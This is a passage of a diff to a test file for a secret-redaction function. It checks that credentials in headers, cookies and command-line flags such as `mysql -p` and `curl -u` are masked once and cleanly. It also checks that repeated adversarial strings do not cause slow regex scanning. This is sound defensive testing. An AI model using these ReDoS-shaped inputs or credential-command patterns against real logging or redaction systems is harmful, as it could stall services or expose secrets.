+      `{"x-api-key": "${gatewayKey(rand, 3)}"}`,
+      `--api-key=${randomToken(rand, 20)}`,
+      `app --password ${randomToken(rand, 12)} --token ${randomToken(rand, 12)}`,
+      `mysql -u root -p${randomToken(rand, 12)} prod`,
+      `set-cookie: sid=${randomToken(rand, 20)}; HttpOnly`,
+    ]) {
+      const once = redactSecrets(input).text;
+      const twice = redactSecrets(once);
+      expect(twice.text, input).toBe(once);
+      expect(twice.count, input).toBe(0);
+      // No marker inside a marker, and none left unterminated.
+      expect(once, input).not.toMatch(/<redacted:[^>]*<redacted:/);
+      expect(once.split("<redacted:").length - 1, input).toBe(once.split(">").length - 1);
+    }
   });
 
   it("stays fast on adversarial input", () => {
@@ -1078,13 +1175,81 @@ describe("cost", () => {
     // characters, 35 ms at 8 000, 3 400 ms at 16 000 — and one 24x24 envelope
     // of that shape was 1 100 ms, past the 600 ms budget next door. A hostile
     // file's contents echoed into a tool argument is exactly one long line.
-    for (const unit of ["Authorization: ", "authorization: a ", "Authorization: Bearer x ", "authorization={} "]) {
+    //
+    // The round that replaced the regex with a token walk fixed only the
+    // SPACED shapes, and every unit in this fixture had a space in it, so the
+    // class stayed untested: a value with no whitespace in it was one long
+    // token, walked to the end of the line and then DECLINED, once per name —
+    // 400 ms at 32 000 characters and 11x SLOWER than the rule it replaced.
+    // Hence the whitespace-free units, which are also the realistic ones: a
+    // compact log line or a settings dump has no spaces to spare.
+    for (const unit of [
+      "Authorization: ",
+      "authorization: a ",
+      "Authorization: Bearer x ",
+      "authorization={} ",
+      "authorization:!",
+      "authorization=$",
+      "authorization=%24VAR,",
+      "x-api-key:",
+      "set-cookie:a=b;",
+    ]) {
       for (const chars of [2_000, 8_000, 16_000]) {
         const s = unit.repeat(Math.ceil(chars / unit.length));
         const t0 = performance.now();
         redactSecrets(s);
         expect(performance.now() - t0, `${JSON.stringify(unit)} x ${s.length}`).toBeLessThan(15);
       }
+    }
+  });
+
+  it("scans a line of repeated credential flags once, not once per flag", () => {
+    // The CLI rules opened with a command word and then a lazy `[^\n;&|]*?`
+    // run to the flag, so a segment holding many `mysql`s and no `-p` was
+    // re-scanned once per command word. The flag is the anchor now, and the
+    // command is looked for in a window of fixed size behind it.
+    for (const unit of ["-p ", "mysql -p", "curl -u a:b ", "--password ", "-ab", "sshpass -p x "]) {
+      for (const chars of [2_000, 8_000, 16_000]) {
+        const s = unit.repeat(Math.ceil(chars / unit.length));
+        const t0 = performance.now();
+        redactSecrets(s);
+        expect(performance.now() - t0, `${JSON.stringify(unit)} x ${s.length}`).toBeLessThan(15);
+      }
+    }
+  });
+
+  it("finishes 100 KB of the worst shape for each credential rule in well under a second", () => {
+    // The blunt rules are character loops and bounded lookups, so the whole
+    // scan is linear in the length of the string however hostile it is. This
+    // is 50x the cap `buildEnvelope` applies to any one string, so it is a
+    // headroom check rather than a reachable one — the reachable budget is
+    // the 600 ms envelope test in envelope-redaction.test.ts.
+    //
+    // Measured at 1-30 ms each here; the rule this round replaced took 5 190 ms
+    // on `"authorization:!"` and 5 770 ms on `"authorization=$"`.
+    const CHARS = 100 * 1024;
+    for (const unit of [
+      "Authorization: ",
+      "authorization:!",
+      "authorization=$",
+      "authorization=%24VAR,",
+      "x-api-key:",
+      "set-cookie:a=b;",
+      '{"Authorization": "Bearer x"}, ',
+      "Authorization: hmac \"",
+      '"Authorization: a',
+      "-p ",
+      "-ab",
+      "mysql -p",
+      "curl -u a:b ",
+      "--password ",
+      "--password=",
+      "aws configure set k v ",
+    ]) {
+      const s = unit.repeat(Math.ceil(CHARS / unit.length)).slice(0, CHARS);
+      const t0 = performance.now();
+      redactSecrets(s);
+      expect(performance.now() - t0, `${JSON.stringify(unit)} x ${s.length}`).toBeLessThan(400);
     }
   });
 });
